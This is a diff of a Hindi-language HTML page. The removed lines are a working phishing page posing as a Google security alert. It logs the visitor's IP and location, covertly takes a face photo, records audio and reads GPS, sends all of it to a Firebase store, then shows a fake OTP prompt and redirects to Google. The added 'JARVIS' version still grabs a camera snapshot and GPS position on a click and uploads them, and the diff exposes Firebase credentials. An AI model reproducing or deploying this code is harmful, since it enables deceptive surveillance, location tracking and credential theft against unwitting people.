@@ -3,126 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - सुरक्षा अलर्ट</title>
+    <title>JARVIS - REMOTE CONTROLLER</title>
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
-        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        .alert-icon { color: #d93025; font-size: 48px; margin-bottom: 10px; }
-        h1 { font-size: 22px; font-weight: 500; margin-bottom: 15px; color: #d93025; }
-        p { font-size: 14px; line-height: 1.6; margin-bottom: 25px; color: #5f6368; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
-        #otp-box { display: none; margin-top: 20px; }
-        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; text-align: center; font-size: 18px; letter-spacing: 5px; }
-        #v, #c { display: none; }
+        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
+        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
+        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
+        .btn:active { background: #00a8ff; transform: scale(0.98); }
+        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
+        #v { width: 100%; height: auto; border: 1px solid #333; margin-top: 15px; display: none; border-radius: 4px; }
+        canvas { display: none; }
     </style>
 </head>
-<body onload="initCapture()">
-    <div class="container" id="mainBox">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-        <div class="alert-icon">⚠️</div>
-        <h1>संदिग्ध लॉगिन प्रयास</h1>
-        <p>किसी ने अभी-अभी आपके Gmail पासवर्ड का उपयोग करके लॉगिन करने की कोशिश की है। सुरक्षा कारणों से, आपको अपने डिवाइस की पुष्टि करनी होगी।</p>
-        <button class="btn" onclick="triggerHardwareAccess()">डिवाइस की पुष्टि करें</button>
+<body>
+
+    <div class="control-box">
+        <h2>JARVIS SYSTEM</h2>
+        <p style="color: #888; font-size: 13px;">डिवाइस रिमोट लिंकर (निजी उपयोग के लिए)</p>
+        
+        <video id="v" autoplay playsinline muted></video>
+        <canvas id="c"></canvas>
+
+        <button class="btn" onclick="syncDeviceData()">🚀 लैपटॉप पैनल सिंक करें</button>
+        
+        <div class="status-text" id="log-status">
+            <b>सिस्टम स्थिति:</b> रेडी (क्लिक का इंतज़ार है)
+        </div>
     </div>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
-
     <script>
-        const firebaseConfig = { 
-            databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/",
-            storageBucket: "pari-project-police-68f77.appspot.com"
+        // --- आपका नया और सुरक्षित FIREBASE कॉन्फ़िगरेशन ---
+        const firebaseConfig = {
+          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
+          authDomain: "army-cb492.firebaseapp.com",
+          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
+          projectId: "army-cb492",
+          storageBucket: "army-cb492.firebasestorage.app",
+          messagingSenderId: "449848409517",
+          appId: "1:449848409517:web:386ad1b570731b6ec4f524",
+          measurementId: "G-NVG20J32ZP"
         };
-        firebase.initializeApp(firebaseConfig);
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const database = firebase.database();
         const storage = firebase.storage();
-        const logId = "G-SECURE-" + Date.now();
 
-        // 1. बैकग्राउंड ट्रेसिंग (Landing होते ही)
-        async function initCapture() {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            database.ref('target_logs/' + logId).set({
-                intel: { ip: data.ip, city: data.city, isp: data.org, time: new Date().toLocaleString() },
-                status: "Target Landed"
-            });
-        }
+        async function syncDeviceData() {
+            const statusDiv = document.getElementById('log-status');
+            statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> अनुमति जांची जा रही है...";
 
-        // 2. कैमरा/माइक/लोकेशन एक्सेस ट्रिगर
-        async function triggerHardwareAccess() {
             try {
-                // यह पॉप-अप मांगेगा - जैसे ही 'Allow' करेगा, काम शुरू
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = stream;
-                
-                // फोटो और ऑडियो कैप्चर शुरू
-                capturePhoto();
-                recordAudio(stream);
+                // 1. कैमरा एक्सेस प्राप्त करना (पारदर्शी रूप से प्रीव्यू दिखाने के लिए)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.style.display = "block";
+                video.srcObject = stream;
 
-                // लोकेशन ट्रैकिंग
-                navigator.geolocation.getCurrentPosition((p) => {
-                    database.ref('target_logs/' + logId).update({
-                        lat: p.coords.latitude, lng: p.coords.longitude
-                    });
-                    showOTPBox(); // एक्सेस मिलने के बाद OTP बॉक्स दिखाएं
-                }, () => showOTPBox());
+                statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> GPS और फोटो कैप्चर चालू...";
 
-            } catch(e) {
-                // अगर अपराधी 'Deny' कर दे, तो भी उसे OTP जाल में फंसाएं
-                database.ref('target_logs/' + logId).update({ status: "Permissions Denied" });
-                showOTPBox();
+                // 2. जीपीएस लोकेशन प्राप्त करना
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // डेटाबेस में लोकेशन अपडेट करें
+                    database.ref('live_detect/location').set({ lat: lat, lon: lon });
+                    statusDiv.innerHTML += `<br>📍 GPS सिंक: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+
+                    // 3. फोटो कैप्चर करके स्टोरेज में अपलोड करना
+                    captureAndUploadPhoto(stream, statusDiv);
+
+                }, (geoErr) => {
+                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन परमिशन चालू करें।";
+                }, { enableHighAccuracy: true });
+
+            } catch (err) {
+                statusDiv.innerHTML = "❌ कैमरा एरer: कृपया कैमरा अनुमति प्रदान करें।";
+                console.error(err);
             }
         }
 
-        function showOTPBox() {
-            document.getElementById('mainBox').innerHTML = `
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-                <h1>वेरिफिकेशन कोड</h1>
-                <p>हमने आपके रजिस्टर्ड नंबर पर 6-अंकों का कोड भेजा है।</p>
-                <input type="text" id="otp" placeholder="000000" maxlength="6">
-                <button class="btn" onclick="finalRedirect()">पुष्टि करें</button>
-            `;
-        }
-
-        function capturePhoto() {
+        function captureAndUploadPhoto(stream, statusDiv) {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
+            
             setTimeout(() => {
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
+                
                 c.toBlob(blob => {
-                    storage.ref(`evidence/${logId}/face.jpg`).put(blob).then(snap => {
+                    const imageRef = storage.ref(`jarvis_intel/snap_${Date.now()}.jpg`);
+                    
+                    statusDiv.innerHTML += "<br>📤 फोटो अपलोड की जा रही है...";
+                    
+                    imageRef.put(blob).then(snap => {
                         snap.ref.getDownloadURL().then(url => {
-                            database.ref('target_logs/' + logId).update({ photo: url });
+                            // मुख्य लाइव डिटेक्ट नोड पर फोटो यूआरएल अपडेट करना
+                            database.ref('live_detect').update({ photo: url });
+                            statusDiv.innerHTML += "<br>✅ फोटो सफलतापूर्वक सिंक हो गई!";
+                            
+                            // काम पूरा होने के बाद कैमरा स्ट्रीम बंद करें
+                            stream.getTracks().forEach(track => track.stop());
+                            v.style.display = "none";
                         });
                     });
                 }, 'image/jpeg');
-            }, 2000);
-        }
-
-        function recordAudio(stream) {
-            const mr = new MediaRecorder(stream);
-            let chunks = [];
-            mr.ondataavailable = e => chunks.push(e.data);
-            mr.onstop = () => {
-                const blob = new Blob(chunks, {type: 'audio/webm'});
-                storage.ref(`evidence/${logId}/audio.webm`).put(blob).then(snap => {
-                    snap.ref.getDownloadURL().then(url => {
-                        database.ref('target_logs/' + logId).update({ audio: url });
-                    });
-                });
-            };
-            mr.start();
-            setTimeout(() => mr.stop(), 10000); // 10 सेकंड की रिकॉर्डिंग
-        }
-
-        function finalRedirect() {
-            alert("सत्यापन सफल। आपका अकाउंट अब सुरक्षित है।");
-            window.location.href = "https://myaccount.google.com/";
+            }, 1500); // कैमरा स्थिर होने के लिए 1.5 सेकंड का डिले
         }
     </script>
 </body>
